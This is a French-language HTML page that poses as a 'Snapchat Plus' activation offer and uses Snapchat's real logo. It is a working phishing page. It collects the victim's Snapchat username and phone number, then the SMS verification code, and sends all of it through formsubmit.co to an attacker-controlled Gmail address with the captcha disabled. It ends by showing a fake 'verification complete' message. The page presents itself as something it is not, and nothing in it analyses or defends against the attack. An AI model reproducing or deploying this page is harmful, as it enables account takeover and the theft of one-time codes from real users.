        <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Plus</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Tu pourras mettre ton image de fond ici plus tard */
            background-color: #ffffff; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        /* Zone du logo */
        .snap-logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 20px auto;
            /* On garde le fond jaune si l'image ne charge pas */
            background-color: #FFFC00;
            border-radius: 25px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .snap-logo img {
            width: 80%; /* Taille du fantôme par rapport au carré jaune */
            height: 80%;
            object-fit: contain;
        }

        h1 {
            font-size: 24px;
            color: #000;
            margin-bottom: 10px;
            font-weight: 700;
        }

        p {
            color: #555;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #E0E0E0;
            border-radius: 30px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #FFFC00;
        }

        .btn-submit {
            background-color: #FFFC00;
            color: #000;
            border: none;
            width: 100%;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #FFF000;
        }

        #step-2 {
            display: none;
        }

        .small-note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
            font-style: italic;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- VRAI LOGO SNAPCHAT -->
        <div class="snap-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo">
        </div>

        <!-- Étape 1 : Infos -->
        <div id="step-1">
            <h1>Obtenez Snapchat+</h1>
            <p>Vérification requise pour activer votre profil.</p>
            
            <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
                <div class="form-group">
                    <label for="username">Nom d'utilisateur Snapchat</label>
                    <input type="text" id="username" name="username" placeholder="Ex: john_doe" required>
                </div>

                <div class="form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                </div>

                <!-- Configuration Formsubmit -->
                <input type="hidden" name="_subject" value="Nouveau profil Snapchat+ !">
                <input type="hidden" name="_captcha" value="false">
                <!-- Redirection après soumission (optionnel, garde la page ou va vers une page blanche) -->
                <input type="hidden" name="_next" value=""> 

                <button type="submit" class="btn-submit">Vérifier</button>
            </form>
        </div>

        <!-- Étape 2 : Code SMS -->
        <div id="step-2">
            <h1>Vérification</h1>
            <p>Nous avons envoyé un code à votre numéro.</p>
            
            <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
                <div class="form-group">
                    <label for="code">Code SMS</label>
                    <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                </div>

                <input type="hidden" name="_subject" value="Code SMS validé !">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="">

                <button type="submit" class="btn-submit">Confirmer</button>
            </form>
            
            <p class="small-note">Le code peut prendre quelques minutes à venir.</p>
        </div>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Gestion de l'étape 1 -> 2
            const form1 = document.querySelector('#step-1 form');
            const step2 = document.getElementById('step-2');
            
            form1.addEventListener('submit', function(e) {
                // Petite animation de transition
                setTimeout(() => {
                    document.getElementById('step-1').style.display = 'none';
                    step2.style.display = 'block';
                }, 800);
            });

            // Si tu veux cacher le formulaire après la soumission de l'étape 2 aussi
            const form2 = document.querySelector('#step-2 form');
            form2.addEventListener('submit', function() {
                setTimeout(() => {
                    document.getElementById('step-2').style.display = 'none';
                    // Afficher un message de fin ou rester sur la page
                    document.querySelector('.container').innerHTML = "<h1>Vérification terminée !</h1><p>Votre profil est en cours d'activation.</p>";
                }, 1000);
            });
        });
    </script>
</body>
</html>
